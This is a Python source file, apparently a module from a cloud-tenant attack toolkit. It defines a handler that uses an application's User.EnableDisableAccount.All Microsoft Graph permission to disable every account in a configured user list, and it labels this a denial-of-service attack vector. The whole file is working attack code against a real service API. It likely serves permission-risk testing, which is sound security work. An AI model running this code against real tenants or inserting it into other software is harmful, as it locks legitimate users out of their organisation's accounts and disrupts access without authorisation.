from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.user_en_dis_handler')


class UserEnDis_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "User.EnableDisableAccount.All" in request.roles:
            status = False
            attack_name = "UserEnableDisableVectors"
            message = ""
            error = "UserEnableDisableVectors - failed"
            conf = request.attack_config['UserEnDis']
            
            logger.debug("User.EnableDisableAccount.All - Allows the app to enable and disable users' accounts, without a signed-in user.")

            logger.debug("Attack vector - DOS.")         
            try:
                for user in conf['users']:
                    create_message_URL = "https://graph.microsoft.com/v1.0/users/" + user
                    message_obj = {
                        "accountEnabled": "false"
                    }

                    result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)
                    code = result.status_code

                    if code == 204:
                        
                        message += "Disabled user: %s \n" % (user)
                        status = True
                    
                            
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in UserEnableDisable_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
